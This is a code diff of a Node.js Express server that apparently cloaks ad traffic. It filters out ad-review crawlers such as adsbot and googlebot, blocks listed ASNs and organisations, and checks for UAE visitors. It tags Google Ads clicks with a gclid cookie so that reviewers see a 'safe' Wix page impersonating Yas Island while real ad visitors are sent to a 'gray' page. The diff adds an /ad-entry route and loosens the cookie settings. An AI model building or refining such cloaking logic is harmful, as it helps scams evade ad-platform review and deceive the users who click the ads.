@@ -5,7 +5,7 @@ const dns = require("dns");
 const fs = require("fs");
 const csv = require("csv-parser");
 const requestIp = require("request-ip");
-const cookieParser = require("cookie-parser"); // ✅ لإدارة الكوكيز
+const cookieParser = require("cookie-parser");
 
 const PORT = process.env.PORT || 10000;
 const SAFE_PAGE = process.env.SAFE_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/seaha";
@@ -13,7 +13,7 @@ const GRAY_PAGE = process.env.GRAY_PAGE || "https://yasislandemiratis.wixstudio.
 const UAE_COUNTRY_CODE = "AE";
 
 app.set("trust proxy", true);
-app.use(cookieParser()); // ✅ تفعيل الكوكي بارسر
+app.use(cookieParser());
 
 const BOT_KEYWORDS = [
   "adsbot", "googlebot", "mediapartners-google", "bingbot", "yandexbot", "baiduspider",
@@ -48,12 +48,10 @@ function isBlockedASN(asn, orgName) {
   if (!asn || !orgName) return false;
   const cleanASN = String(asn).trim().toUpperCase();
   const cleanOrg = orgName.toLowerCase();
-
   return blockedASNList.some(entry => {
     const asnMatch = entry.asn === cleanASN;
     const orgMatch = cleanOrg.includes(entry.orgName);
-    const typeMatch = true; // ✅ تم شمل CDN أيضًا للتشدد
-
+    const typeMatch = true;
     return (asnMatch || orgMatch) && typeMatch;
   });
 }
@@ -137,6 +135,20 @@ app.use(requestIp.mw());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+// ✅ نقطة دخول خاصة للإعلانات تحفظ الكوكي وتعيد التوجيه
+app.get("/ad-entry", (req, res) => {
+  const hasGclid = typeof req.query.gclid !== "undefined";
+  if (hasGclid) {
+    res.cookie("from_ads", "1", {
+      maxAge: 3 * 60 * 1000,
+      httpOnly: false,
+      sameSite: "Lax"
+    });
+    console.log("🎯 Set from_ads cookie due to gclid:", req.query.gclid);
+  }
+  res.redirect("/");
+});
+
 // --- Main Route Handler ---
 app.all("*", async (req, res) => {
   const ip = req.clientIp || req.ip || "no-ip";
@@ -145,20 +157,18 @@ app.all("*", async (req, res) => {
 
   console.log(`📎 Referrer: ${referrer}`);
 
-  // ✅ فحص gclid من req.query مباشرة
   const hasGclid = typeof req.query.gclid !== "undefined";
   console.log("💡 gclid from query:", req.query.gclid);
 
   if (hasGclid) {
     res.cookie("from_ads", "1", {
-      maxAge: 3 * 60 * 1000, // ⏱️ صالح لمدة 3 دقائق فقط
-      httpOnly: true,
-      sameSite: "strict"
+      maxAge: 3 * 60 * 1000,
+      httpOnly: false,
+      sameSite: "Lax"
     });
   }
 
   let countryCode = null, asn = null, orgName = null;
-
   const uaLower = ua.toLowerCase();
   const isUptimeRobot = uaLower.includes("uptimerobot");
 
